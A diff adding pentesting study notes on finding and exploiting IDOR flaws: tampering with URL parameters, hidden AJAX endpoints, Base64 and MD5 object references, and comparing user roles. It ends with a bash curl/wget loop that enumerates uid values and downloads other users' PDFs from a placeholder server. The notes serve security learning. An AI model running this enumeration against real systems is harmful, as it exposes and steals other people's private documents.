@@ -312,3 +312,114 @@
 
 ---
 
+# Identifying IDOR Vulnerabilities
+
+## 1. URL Parameters & APIs
+- Look for object references in URLs or API parameters: e.g., `?uid=1`, `?filename=file_1.pdf`.
+- Try modifying/incrementing values (e.g., `?uid=2`) to access unauthorized data.
+- Use fuzzing tools to automate the testing of various object references.
+- Successful access to data not owned by the current user indicates a potential IDOR.
+
+## 2. AJAX Calls
+- Check front-end JavaScript for unused or hidden AJAX functions.
+- Some functions may exist but be disabled based on user roles.
+- Example:
+
+```javascript
+$.ajax({
+    url: "change_password.php",
+    type: "post",
+    data: {uid: user.uid, password: user.password, is_admin: is_admin}
+});
+````
+
+* Even if not visible in the UI, test discovered functions manually for IDOR vulnerabilities.
+
+## 3. Hashing / Encoding of Object References
+
+* Some references may use encoding (e.g., Base64) or hashing (e.g., MD5).
+* **Base64 Example**:
+
+  * `filename=ZmlsZV8xMjMucGRm` → decode to `file_123.pdf`, then encode `file_124.pdf`.
+* **Hashing Example**:
+
+  * If hash is derived from a filename:
+
+    * `CryptoJS.MD5('file_1.pdf') → 'c81e728d...'`
+    * Hash another filename and test access.
+
+## 4. Compare User Roles
+
+* Create multiple user accounts to compare requests and responses.
+* Observe how object references differ between users.
+* Try reusing one user’s request (e.g., salary data) while logged in as another user.
+
+```json
+{
+  "type": "salary",
+  "url": "/services/data/salaries/users/1"
+}
+```
+
+* If access is granted without proper verification, an IDOR vulnerability exists.
+
+## Key Indicators
+
+* Predictable object references.
+* Reused or shared identifiers.
+* Missing server-side permission checks.
+* Hidden or unused parameters/API endpoints.
+
+---
+
+# Mass IDOR Enumeration 
+
+## Overview
+- After identifying an IDOR vulnerability, mass enumeration can be used to access large sets of unauthorized data.
+- Often occurs when predictable parameters (e.g., `uid=1`, `uid=2`) are used without back-end access control.
+
+## Example Scenario
+- Employee Manager application shows documents using URL:  
+  `documents.php?uid=1`
+- Document links follow a predictable pattern:
+  - `/documents/Invoice_1_09_2021.pdf`
+  - `/documents/Report_1_10_2021.pdf`
+- Changing `uid` to another number may expose other users' documents if access control is missing.
+
+## Vulnerable Patterns
+- Predictable file names using UID and date.
+- GET parameters like `uid` or `uid_filter` directly control data access.
+- Filter removal (e.g., removing `uid_filter`) may expose all documents.
+
+## Mass Enumeration Using Bash Script
+
+### Step 1: Identify Document Links
+```bash
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+````
+
+### Step 2: Create Enumeration Script
+
+```bash
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+        wget -q $url/$link
+    done
+done
+```
+
+* Loops through UID values from 1 to 10.
+* Extracts PDF links using regex.
+* Downloads each document using `wget`.
+
+## Tools for Automation
+
+* **Burp Suite Intruder**: Automate parameter fuzzing and IDOR testing.
+* **OWASP ZAP Fuzzer**: Perform mass IDOR testing through automated requests.
+* **Custom scripts**: Bash, Python, or PowerShell can be used to automate enumeration and downloads.
+
+---
